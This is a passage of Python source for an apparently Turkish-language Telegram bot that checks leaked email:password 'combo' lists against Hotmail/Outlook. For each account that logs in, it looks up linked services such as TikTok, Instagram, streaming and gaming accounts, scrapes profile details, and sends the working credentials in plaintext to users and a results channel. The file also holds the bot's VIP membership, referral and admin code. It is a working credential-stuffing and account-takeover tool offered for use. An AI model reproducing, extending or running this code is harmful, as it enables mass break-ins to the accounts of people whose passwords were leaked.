            'posts': user.get('media_count', 0), 'is_private': user.get('is_private', False),
            'is_verified': user.get('is_verified', False), 'is_business': user.get('is_business', False),
            'join_date': join_date, 'country': country, 'profile_pic': user.get('profile_pic_url', 'Bilinmiyor')
        }
    except:
        return None

def send_to_channel_func(text, file_content=None, filename=None):
    try:
        if file_content:
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = filename or "results.txt"
            bot.send_document(RESULTS_CHANNEL, file_obj, caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except:
        return False

def create_new_format_file(service_name, hits):
    header = f"""╔════════════════════════════════════════════════╗
║ {service_name} Hitleri - {MY_SIGNATURE}                 
║ Web: {CHANNEL}                           
╚════════════════════════════════════════════════╝

"""
    content = header
    for hit in hits:
        content += hit + "\n"
    return content

# ==================== SCAN FUNCTIONS ====================
def start_real_scan(user_id, file_path, chat_id, scan_mode, custom_domain=""):
    active_scans[user_id] = True
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
    except:
        bot.send_message(chat_id, "❌ Dosya okuma hatası!")
        active_scans[user_id] = False
        return
    total = len(lines)
    hits = 0
    bad = 0
    retry_count = 0
    linked_total = 0
    all_hits = []
    if scan_mode == "gaming":
        services_to_check = SERVICES_GAMING
    elif scan_mode == "social":
        services_to_check = SERVICES_SOCIAL
    elif scan_mode == "streaming":
        services_to_check = SERVICES_STREAMING
    elif scan_mode == "ai":
        services_to_check = SERVICES_AI
    elif scan_mode == "tiktok":
        services_to_check = None
    elif scan_mode == "single" and custom_domain:
        services_to_check = {custom_domain: custom_domain}
    elif scan_mode == "single_platform":
        platform_name = user_sessions.get(user_id, {}).get("platform", "")
        if platform_name:
            platform_email = None
            for service_name, email in SERVICES_ALL.items():
                if service_name == platform_name:
                    platform_email = email
                    break
            if platform_email:
                services_to_check = {platform_name: platform_email}
            else:
                services_to_check = SERVICES_ALL
        else:
            services_to_check = SERVICES_ALL
    else:
        services_to_check = SERVICES_ALL
    progress_msg = bot.send_message(chat_id, "⚡ KONTROL EDİLİYOR\n✅ Hit: 0\n❌ Bad: 0\n━━━━━━━━━━━━━━━━━━━━\n📊 İlerleme: 0/0\n🔍 Mevcut: Başlıyor...", parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
    start_time = time.time()
    for i, line in enumerate(lines):
        if not active_scans.get(user_id, False):
            bot.send_message(chat_id, "⏹ Tarama durduruldu")
            break
        try:
            if ':' not in line:
                continue
            email, password = line.split(':', 1)
            result = HotmailChecker.check_account(email, password)
            if result["status"] == "HIT":
                hits += 1
                if scan_mode == "tiktok":
                    tiktok_data = HotmailChecker.check_tiktok_full(email, password, result["token"], result["cid"])
                    if tiktok_data:
                        all_hits.append({"email": email, "password": password, "services": [f"TikTok (@{tiktok_data['username']})"]})
                        verified_emoji = "✅" if tiktok_data.get('verified', False) else "❌"
                        hit_msg = f"━━━━━━━━━━━━━━━━━━━━\n⚡ TIKTOK HİT #{hits}\n━━━━━━━━━━━━━━━━━━━━\n📧 {email}\n🔑 {password}\n🎵 TikTok: @{tiktok_data['username']}\n👥 Takipçi: {format_number(tiktok_data.get('followers', 0))}\n❤️ Beğeni: {format_number(tiktok_data.get('likes', 0))}\n{verified_emoji} Doğrulandı\n💎 {MY_SIGNATURE}"
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                else:
                    found_services = HotmailChecker.check_services(email, password, result["token"], result["cid"], services_to_check)
                    linked_total += len(found_services)
                    all_hits.append({"email": email, "password": password, "services": found_services})
                    if found_services:
                        services_text = "\n".join([f"✅ {s}" for s in found_services])
                        hit_msg = f"━━━━━━━━━━━━━━━━━━━━\n⚡ HİT #{hits}\n━━━━━━━━━━━━━━━━━━━━\n📧 {email}\n🔑 {password}\n🔗 Servisler:\n{services_text}\n💎 {MY_SIGNATURE}"
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                    else:
                        hit_msg = f"━━━━━━━━━━━━━━━━━━━━\n⚡ HİT #{hits}\n━━━━━━━━━━━━━━━━━━━━\n📧 {email}\n🔑 {password}\n⚠️ Servis yok\n💎 {MY_SIGNATURE}"
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
            elif result["status"] == "RETRY":
                retry_count += 1
            else:
                bad += 1
            if i % 5 == 0 or i == total - 1:
                progress = ((i+1) / total * 100) if total > 0 else 0
                try:
                    bot.edit_message_text(f"⚡ KONTROL EDİLİYOR\n✅ Hit: {hits}\n❌ Bad: {bad}\n━━━━━━━━━━━━━━━━━━━━\n📊 İlerleme: {i+1}/{total} ({progress:.1f}%)\n🔍 Mevcut: {email[:30]}", chat_id, progress_msg.message_id, parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                except:
                    pass
            time.sleep(0.1)
        except:
            bad += 1
    if all_hits:
        hits_by_service = {}
        for hit_data in all_hits:
            for service in hit_data.get('services', []):
                if service not in hits_by_service:
                    hits_by_service[service] = []
                hits_by_service[service].append(f"{hit_data['email']}:{hit_data['password']}")
        for service_name, service_hits in hits_by_service.items():
            safe_name = service_name.replace(" ", "_").replace("+", "Plus")
            file_content = create_new_format_file(service_name, service_hits)
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = f"{safe_name}_Hitler.txt"
            try:
                bot.send_document(chat_id, file_obj, caption=f"📁 {service_name} Hitleri\nToplam: {len(service_hits)} hit\n💎 {MY_SIGNATURE}")
            except:
                pass
    bot.send_message(chat_id, f"✅ TARAMA TAMAMLANDI!\n📊 Hit: {hits}\n❌ Bad: {bad}\n📦 Toplam: {total}\n💎 {MY_SIGNATURE}", parse_mode='HTML')
    update_stats(user_id, hits, bad, total)
    os.remove(file_path)
    if user_id in user_sessions:
        del user_sessions[user_id]
    active_scans[user_id] = False

def check_one_account_full(email, password, user_id):
    bot.send_message(user_id, f"🔍 Kontrol: {email}")
    result = HotmailChecker.check_account(email, password)
    if result["status"] != "HIT":
        bot.send_message(user_id, f"❌ GEÇERSİZ\n📧 {email}")
        return
    token = result.get("token")
    cid = result.get("cid")
    bot.send_message(user_id, f"✅ GEÇERLİ! Servisler kontrol ediliyor...")
    services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)
    if not services:
        bot.send_message(user_id, f"📧 {email}:{password}\n❌ Servis yok")
        return
    if "Instagram" in services:
        ig_username = email.split('@')[0]
        ig_info = get_instagram_full_info(ig_username)
        if ig_info:
            flag = get_country_flag(ig_info['country'])
            ig_text = f"📸 INSTAGRAM FULL\n📧 {email}:{password}\n👤 @{ig_info['username']}\n👥 Takipçi: {ig_info['followers']:,}\n📅 Katılım: {ig_info['join_date']}\n{flag} {ig_info['country']}\n💎 {MY_SIGNATURE}"
            bot.send_message(user_id, ig_text, parse_mode='HTML')
            if ig_info['profile_pic'] != 'Bilinmiyor':
                try:
                    bot.send_photo(user_id, ig_info['profile_pic'])
                except:
                    pass
    if "TikTok" in services:
        tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)
        if tk_result and tk_result.get('has_tiktok'):
            tk_text = f"🎵 TIKTOK FULL\n📧 {email}:{password}\n👤 @{tk_result.get('username', 'Bilinmiyor')}\n👥 Takipçi: {format_number(tk_result.get('followers', 0))}\n❤️ Beğeni: {format_number(tk_result.get('likes', 0))}\n💎 {MY_SIGNATURE}"
            bot.send_message(user_id, tk_text, parse_mode='HTML')
    summary = f"✅ KONTROL TAMAM\n📧 {email}:{password}\n📊 Servisler ({len(services)}):\n" + "\n".join(f"• {s}" for s in services) + f"\n💎 {MY_SIGNATURE}"
    bot.send_message(user_id, summary, parse_mode='HTML')

def process_instagram_scan(user_id, combos):
    bot.send_message(user_id, f"📸 Instagram taraması başlıyor... Combo: {len(combos)}")
    hits = []
    ig_hits = 0
    for combo in combos[:50]:
        if user_id in active_scans and not active_scans[user_id]:
            break
        try:
            email, password = combo.split(':', 1)
            result = HotmailChecker.check_account(email, password)
            if result["status"] == "HIT":
                ig_check = HotmailChecker.check_services(email, password, result["token"], result["cid"], {"Instagram": "security@mail.instagram.com"})
                if ig_check and "Instagram" in ig_check:
                    ig_username = email.split('@')[0]
                    ig_info = get_instagram_full_info(ig_username)
                    if ig_info:
                        ig_hits += 1
                        flag = get_country_flag(ig_info['country'])
                        hit_line = f"{email}:{password} | {flag} {ig_info['country']} | {ig_info['followers']:,} takipçi"
                        hits.append(hit_line)
                        bot.send_message(user_id, f"📸 Hit #{ig_hits}\n👤 @{ig_info['username']}\n👥 {ig_info['followers']:,} takipçi")
        except:
            continue
    if hits:
        file_content = create_new_format_file("Instagram_Full", hits)
        file_obj = BytesIO(file_content.encode('utf-8'))
        file_obj.name = "Instagram_Full.txt"
        bot.send_document(user_id, file_obj, caption=f"✅ Tamamlandı!\n📸 Hit: {ig_hits}\n💎 {MY_SIGNATURE}")
        send_to_channel_func(f"Instagram Full: {ig_hits} hit", file_content, "Instagram_Full.txt")
    else:
        bot.send_message(user_id, f"✅ Bitti! Hit bulunamadı")
    update_last_scan(user_id)
    if user_id in active_scans:
        del active_scans[user_id]
    if user_id in user_sessions:
        del user_sessions[user_id]

# ==================== ADMIN HANDLERS ====================
def process_add_vip_step1(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        target_user_id = int(message.text.strip())
        bot.pending_vip_user = target_user_id
        bot.pending_vip_username = "Bilinmiyor"
        bot.send_message(message.chat.id, f"✅ Kullanıcı: {target_user_id}\nSüre seçin:", parse_mode='HTML', reply_markup=vip_duration_keyboard())
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_remove_vip(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        target_user_id = int(message.text.strip())
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        if user[2] == 0:
            bot.send_message(message.chat.id, "❌ Kullanıcı VIP değil!")
            return
        remove_vip(target_user_id)
        bot.send_message(message.chat.id, f"✅ VIP Kaldırıldı!\n{target_user_id} artık ücretsiz.", parse_mode='HTML')
        try:
            bot.send_message(target_user_id, "⚠️ VIP üyeliğiniz kaldırıldı.")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_ban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        target_user_id = int(message.text.strip())
        if target_user_id == ADMIN_ID:
            bot.send_message(message.chat.id, "❌ Admin yasaklanamaz!")
            return
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        ban_user(target_user_id)
        bot.send_message(message.chat.id, f"✅ Kullanıcı Yasaklandı!\n{target_user_id} artık yasaklı.", parse_mode='HTML')
        try:
            bot.send_message(target_user_id, f"❌ Admin {MY_SIGNATURE} tarafından yasaklandınız!")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_unban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        target_user_id = int(message.text.strip())
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        if user[4] == 0:
            bot.send_message(message.chat.id, "❌ Kullanıcı yasaklı değil!")
            return
        unban_user(target_user_id)
        bot.send_message(message.chat.id, f"✅ Yasak Kaldırıldı!\n{target_user_id} artık botu kullanabilir.", parse_mode='HTML')
        try:
            bot.send_message(target_user_id, "✅ Yasağınız kaldırıldı! Tekrar hoş geldiniz!")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_broadcast_all(message):
    broadcast_text = message.text
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE is_banned = 0")
    users = c.fetchall()
    conn.close()
    if not users:
        bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
        return
    success = 0
    failed = 0
    status_msg = bot.send_message(message.chat.id, f"📤 Duyuru gönderiliyor...\nİlerleme: 0/{len(users)}")
    for i, user in enumerate(users, 1):
        user_id = user[0]
        try:
            bot.send_message(user_id, f"📢 Admin Mesajı\n\n{broadcast_text}", parse_mode='HTML')
            success += 1
        except:
            failed += 1
        if i % 10 == 0:
            try:
                bot.edit_message_text(f"📤 Duyuru gönderiliyor...\nİlerleme: {i}/{len(users)}\n✅ Başarılı: {success}\n❌ Başarısız: {failed}", message.chat.id, status_msg.message_id)
            except:
                pass
    bot.edit_message_text(f"✅ Duyuru Tamamlandı!\n📊 Toplam: {len(users)}\n✅ Başarılı: {success}\n❌ Başarısız: {failed}", message.chat.id, status_msg.message_id, parse_mode='HTML')

def process_broadcast_one_step1(message):
    try:
        target_user_id = int(message.text.strip())
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        user_sessions[message.from_user.id] = {"broadcast_target": target_user_id}
        bot.send_message(message.chat.id, f"👤 Kullanıcıya Gönder: {target_user_id}\nŞimdi mesajı gönderin:", parse_mode='HTML')
        bot.register_next_step_handler(message, process_broadcast_one_step2)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_broadcast_one_step2(message):
    broadcast_text = message.text
    target_user_id = user_sessions.get(message.from_user.id, {}).get("broadcast_target")
    if not target_user_id:
        bot.send_message(message.chat.id, "❌ Hata: Hedef kullanıcı bulunamadı!")
        return
    try:
        bot.send_message(target_user_id, f"📢 Admin Mesajı\n\n{broadcast_text}", parse_mode='HTML')
        bot.send_message(message.chat.id, f"✅ Mesaj {target_user_id} kullanıcısına gönderildi!", parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Mesaj gönderilemedi!\nHata: {e}", parse_mode='HTML')

def process_custom_domain(message):
    user_id = message.from_user.id
    custom_domain = message.text.strip()
    if user_id in user_sessions:
        user_sessions[user_id]["custom_domain"] = custom_domain
    bot.send_message(message.chat.id, f"✅ Domain: {custom_domain}\nŞimdi combo dosyasını gönderin!", parse_mode='HTML')

# ==================== CALLBACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if call.data.startswith("admin_") and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Sadece admin!", show_alert=True)
        return
    
    if call.data == "vip_required":
        bot.answer_callback_query(call.id, yazi(lang, 'vip_gerekli'), show_alert=True)
        return
    
    if call.data.startswith("stop_scan_"):
        scan_user_id = int(call.data.replace("stop_scan_", ""))
        if scan_user_id == user_id or user_id == ADMIN_ID:
            if scan_user_id in active_scans:
                active_scans[scan_user_id] = False
                bot.answer_callback_query(call.id, "⏹ Tarama durduruldu!", show_alert=True)
        return
    
    if call.data == "back_main":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
    
    if call.data == "admin_panel":
        bot.edit_message_text("🔧 ADMIN PANELİ\nBir seçenek seçin:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_panel_keyboard())
        return
    
    if call.data == "admin_add_vip":
        bot.edit_message_text("➕ VIP EKLE\nKullanıcı ID'sini gönderin:", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_add_vip_step1)
        return
    
    if call.data == "admin_remove_vip":
        bot.edit_message_text("➖ VIP KALDIR\nKullanıcı ID'sini gönderin:", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_remove_vip)
        return
    
    if call.data == "admin_list_vips":
        vips = get_all_vips()
        if not vips:
            vip_text = "📋 VIP ÜYELER\n❌ VIP üye yok"
        else:
            vip_text = "📋 VIP ÜYELER\n\n"
            for vip in vips:
                vip_text += f"• {vip[0]} @{vip[1] or 'Yok'}\n   Bitiş: {vip[2]}\n\n"
        bot.edit_message_text(vip_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_panel_keyboard())
        return
    
    if call.data == "admin_ban_user":
        bot.edit_message_text("🚫 KULLANICI YASAKLA\nYasaklanacak kullanıcı ID'sini gönderin:", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_ban_user)
        return
    
    if call.data == "admin_unban_user":
        bot.edit_message_text("✅ YASAK KALDIR\nYasağı kaldırılacak kullanıcı ID'sini gönderin:", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_unban_user)
        return
    
    if call.data == "admin_banned_list":
        banned = get_banned_users()
        if not banned:
            ban_text = "📋 YASAKLI KULLANICILAR\n❌ Yasaklı kullanıcı yok"
        else:
            ban_text = "📋 YASAKLI KULLANICILAR\n\n"
            for user in banned:
                ban_text += f"• {user[0]} @{user[1] or 'Yok'}\n   Sebep: {user[2] or 'Yok'}\n\n"
        bot.edit_message_text(ban_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_panel_keyboard())
        return
    
    if call.data == "admin_stats":
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        total_banned = c.fetchone()[0]
        c.execute("SELECT SUM(total_scans) FROM users")
        total_scans = c.fetchone()[0] or 0
        c.execute("SELECT SUM(total_hits) FROM users")
        total_hits = c.fetchone()[0] or 0
        conn.close()
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("📋 Ücretsiz Kullanıcılar", callback_data="view_free_users"))
        markup.add(types.InlineKeyboardButton("👑 VIP Kullanıcılar", callback_data="view_vip_users"))
        markup.add(types.InlineKeyboardButton("🚫 Yasaklı Kullanıcılar", callback_data="admin_banned_list"))
        markup.add(types.InlineKeyboardButton("◀️ Geri", callback_data="admin_panel"))
        stats_text = f"📊 BOT İSTATİSTİKLERİ\n\n👥 Toplam Kullanıcı: {total_users}\n👑 VIP: {total_vips}\n🚫 Yasaklı: {total_banned}\n📈 Toplam Tarama: {total_scans}\n✅ Toplam Hit: {total_hits}\n💎 {MY_SIGNATURE}"
        bot.edit_message_text(stats_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
        return
    
    if call.data == "admin_broadcast":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("📤 Tüm Kullanıcılara", callback_data="broadcast_all"))
        markup.add(types.InlineKeyboardButton("👤 Tek Kullanıcıya", callback_data="broadcast_one"))
        markup.add(types.InlineKeyboardButton("◀️ Geri", callback_data="admin_panel"))
        bot.edit_message_text("📢 DUYURU GÖNDER\nDuyuru türünü seçin:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
        return
    
    if call.data == "broadcast_all":
        bot.edit_message_text("📤 TÜM KULLANICILARA DUYURU\nYayınlamak istediğiniz mesajı gönderin:\n⚠️ Bu TÜM kullanıcılara gönderilecek!", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_broadcast_all)
        return
    
    if call.data == "broadcast_one":
        bot.edit_message_text("👤 TEK KULLANICIYA GÖNDER\nKullanıcı ID'sini gönderin:", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_broadcast_one_step1)
        return
    
    if call.data == "view_free_users":
        free_users = get_free_users()
        if not free_users:
            user_text = "📋 ÜCRETSİZ KULLANICILAR\n❌ Ücretsiz kullanıcı yok"
        else:
            user_text = f"📋 ÜCRETSİZ KULLANICILAR ({len(free_users)} toplam)\n\n"
            for user in free_users[:20]:
                user_text += f"• {user[0]} @{user[1] or 'Yok'}\n"
            if len(free_users) > 20:
                user_text += f"\n... ve {len(free_users) - 20} kişi daha"
        bot.edit_message_text(user_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_panel_keyboard())
        return
    
    if call.data == "view_vip_users":
        vips = get_all_vips()
        if not vips:
            vip_text = "📋 VIP KULLANICILAR\n❌ VIP kullanıcı yok"
        else:
            vip_text = f"📋 VIP KULLANICILAR ({len(vips)} toplam)\n\n"
            for vip in vips:
                vip_text += f"• {vip[0]} @{vip[1] or 'Yok'}\n   Bitiş: {vip[2]}\n\n"
        bot.edit_message_text(vip_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_panel_keyboard())
        return
    
    if call.data.startswith("vip_duration_"):
        duration = call.data.replace("vip_duration_", "")
        if hasattr(bot, 'pending_vip_user'):
            target_user_id = bot.pending_vip_user
            target_username = bot.pending_vip_username
            add_vip(target_user_id, target_username, duration)
            duration_text = {"1h": "1 Saat", "1d": "1 Gün", "1w": "1 Hafta", "1m": "1 Ay", "forever": "Sonsuz"}
            bot.edit_message_text(f"✅ VIP Eklendi!\nKullanıcı: {target_user_id}\nSüre: {duration_text.get(duration, 'Bilinmiyor')}", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_panel_keyboard())
            try:
                bot.send_message(target_user_id, f"🎉 Tebrikler! Artık VIP'siniz!\nSüre: {duration_text.get(duration, 'Bilinmiyor')}", parse_mode='HTML')
            except:
                pass
            delattr(bot, 'pending_vip_user')
            delattr(bot, 'pending_vip_username')
        return
    
    if call.data == "back_to_scan_modes":
        bot.edit_message_text("⚡ TARAMA MODU SEÇİN", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=scan_mode_keyboard(user_id))
        return
    
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if mode == "single_platform":
            bot.edit_message_text("🎯 TEK PLATFORM SEÇİN", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=single_platform_keyboard())
            return
        user_sessions[user_id] = {"mode": mode}
        description = get_mode_description(mode)
        if mode == "custom":
            bot.edit_message_text(description + "\n\n📝 Domain adını gönderin:\nÖrnek: netflix.com", call.message.chat.id, call.message.message_id, parse_mode='HTML')
            bot.register_next_step_handler(call.message, process_custom_domain)
        else:
            bot.edit_message_text(description + "\n\n📁 Şimdi combo dosyanızı gönderin\nFormat: email:şifre", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        return
    
    if call.data.startswith("platform_"):
        platform_name = call.data.replace("platform_", "")
        user_sessions[user_id] = {"mode": "single_platform", "platform": platform_name}
        bot.edit_message_text(f"✅ Seçildi: {platform_name}\n\nSadece {platform_name} kontrol edilecek!\n\n📁 Şimdi combo dosyasını gönderin", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        return
    
    if call.data == "scan_check_one":
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, yazi(lang, 'tek_kontrol') + "\n\nGönderin: email@outlook.com:şifre\n\nÖrnek:\nornek@outlook.com:Sifre123", parse_mode='HTML')
        user_sessions[user_id] = {"mode": "check_one_account"}
        return
    
    if call.data == "scan_instagram_full":
        if not is_vip(user_id):
            bot.answer_callback_query(call.id, yazi(lang, 'vip_gerekli'), show_alert=True)
            return
        can, remaining = can_scan(user_id)
        if not can:
            bot.send_message(user_id, f"⏰ Bekleyin {remaining}")
            return
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, yazi(lang, 'insta_tam') + "\n\n📤 Combo dosyası gönderin (.txt)\nFormat: email:şifre", parse_mode='HTML')
        user_sessions[user_id] = {"mode": "instagram_full_capture"}
        return

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if is_banned(user_id):
        bot.send_message(message.chat.id, f"❌ {yazi(lang, 'hata')}! {MY_SIGNATURE}")
        return
    
    args = message.text.split()
    if len(args) > 1:
        ref_code = args[1]
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE referral_code = ?", (ref_code,))
        referrer = c.fetchone()
        conn.close()
        if referrer and referrer[0] != user_id:
            referrer_id = referrer[0]
            add_user(user_id, username)
            if process_referral(user_id, referrer_id):
                try:
                    bot.send_message(referrer_id, f"🎉 Yeni Referral!\nKullanıcı {user_id} linkinizle katıldı!\n✅ +1 saat VIP kazandınız!", parse_mode='HTML')
                except:
                    pass
    
    add_user(user_id, username)
    
    vip_status = yazi(lang, 'vip') if is_vip(user_id) else yazi(lang, 'ucretsiz')
    admin_badge = yazi(lang, 'admin') if user_id == ADMIN_ID else ""
    
    welcome = f"""
╔══════════════════════════════════════╗
║     🔒 {yazi(lang, 'baslik')} 🔒     ║
╚══════════════════════════════════════╝

{yazi(lang, 'hosgeldin')} <b>{username}</b>!

🆔 {yazi(lang, 'id')}: <code>{user_id}</code>
👑 {yazi(lang, 'durum')}: {vip_status} {admin_badge}

💎 {MY_SIGNATURE}
"""
    bot.send_message(message.chat.id, welcome, parse_mode='HTML', reply_markup=main_menu_keyboard(user_id))

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text
    
    if is_banned(user_id):
        bot.send_message(message.chat.id, f"❌ {yazi(lang, 'hata')}!")
        return
    
    if user_sessions.get(user_id, {}).get('mode') == 'check_one_account':
        if ':' not in text:
            bot.send_message(user_id, "❌ Geçersiz format! Kullanın: email:şifre")
            return
        email, password = text.strip().split(':', 1)
        check_one_account_full(email, password, user_id)
        if user_id in user_sessions:
            del user_sessions[user_id]
        return
    
    if text == yazi(lang, 'baslat'):
        can, remaining = can_scan(user_id)
        if not can:
            bot.send_message(message.chat.id, f"{yazi(lang, 'hiz_limiti')}!\n{yazi(lang, 'sonraki')}: {remaining}\n\n{yazi(lang, 'sinirsiz')}!", parse_mode='HTML')
            return
        bot.send_message(message.chat.id, "⚡ TARAMA MODU SEÇİN", parse_mode='HTML', reply_markup=scan_mode_keyboard(user_id))
    
    elif text == yazi(lang, 'istatistik'):
        user = get_user(user_id)
        if user:
            stats = f"""
📊 {yazi(lang, 'istatistik')}
━━━━━━━━━━━━━━━━━━━━━
🆔 {yazi(lang, 'id')}: <code>{user[0]}</code>
👤 @{user[1] or 'Yok'}
👑 {yazi(lang, 'durum')}: {'VIP' if user[2] else yazi(lang, 'ucretsiz')}
📈 {yazi(lang, 'toplam')} {yazi(lang, 'hit')}: {user[11] or 0}
📊 {yazi(lang, 'toplam')} {yazi(lang, 'bad')}: {user[10] or 0}
━━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}
"""
            bot.send_message(message.chat.id, stats, parse_mode='HTML')
    
    elif text == yazi(lang, 'uyelik'):
        user = get_user(user_id)
        if user and user[2]:
            expiry = user[3] if user[3] == "Forever" else user[3][:19]
            membership = f"""
👑 VIP ÜYELİK
✅ Durum: Aktif
⏰ Geçerlilik: {expiry}
🎁 VIP Avantajları:
✅ Sınırsız tarama
✅ TikTok Full Capture
✅ Instagram Full Capture
💎 {MY_SIGNATURE}
"""
        else:
            membership = f"""
⭐ ÜCRETSİZ ÜYELİK
📋 Ücretsiz Özellikler:
✅ Saatte 1 tarama
✅ Tüm tarama modları
✅ AI Platformları
👑 VIP için adminle iletişime geçin!
💎 {MY_SIGNATURE}
"""
        bot.send_message(message.chat.id, membership, parse_mode='HTML')
    
    elif text == yazi(lang, 'referral'):
        user = get_user(user_id)
        if user:
            ref_code = user[6]
            ref_count = user[8]
            bot_info = bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"
            markup = types.InlineKeyboardMarkup()
            share_btn = types.InlineKeyboardButton("📤 Linki Paylaş", url=f"https://t.me/share/url?url={urllib.parse.quote(ref_link)}&text={urllib.parse.quote('En iyi Hotmail checker botuna katıl!')}")
            markup.add(share_btn)
            referral_text = f"""
🔗 REFERRAL SİSTEMİ
👥 Her yeni kullanıcı için +1 saat VIP kazanın!
🎯 Linkiniz: <code>{ref_link}</code>
📊 Toplam Referral: {ref_count} kullanıcı
💎 {MY_SIGNATURE}
"""
            bot.send_message(message.chat.id, referral_text, parse_mode='HTML', reply_markup=markup)
    
    elif text == yazi(lang, 'destek'):
        bot.send_message(message.chat.id, f"📞 {MY_SIGNATURE}\n🌐 {CHANNEL}", parse_mode='HTML')
    
    elif text == yazi(lang, 'admin_panel') and user_id == ADMIN_ID:
        bot.send_message(message.chat.id, "🔧 ADMIN PANELİ", parse_mode='HTML', reply_markup=admin_panel_keyboard())

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        return
    
    mode = user_sessions.get(user_id, {}).get("mode", "")
    if mode == "instagram_full_capture":
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = downloaded.decode('utf-8', errors='ignore')
            combos = [line.strip() for line in text.split('\n') if line.strip() and ':' in line]
            if not combos:
                bot.send_message(user_id, "❌ Geçerli combo bulunamadı!")
                return
            bot.send_message(user_id, f"✅ {len(combos)} combo\n🔍 Başlıyor...")
            active_scans[user_id] = True
            threading.Thread(target=process_instagram_scan, args=(user_id, combos), daemon=True).start()
        except Exception as e:
            bot.send_message(user_id, f"❌ Hata: {e}")
        return
    
    can, remaining = can_scan(user_id)
    if not can:
        bot.send_message(message.chat.id, f"{yazi(lang, 'hiz_limiti')}! {remaining}")
        return
    
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    
    file_path = f"temp_{user_id}.txt"
    with open(file_path, 'wb') as f:
        f.write(downloaded)
    
    update_last_scan(user_id)
    
    scan_mode = user_sessions.get(user_id, {}).get("mode", "all")
    custom_domain = user_sessions.get(user_id, {}).get("custom_domain", "")
    
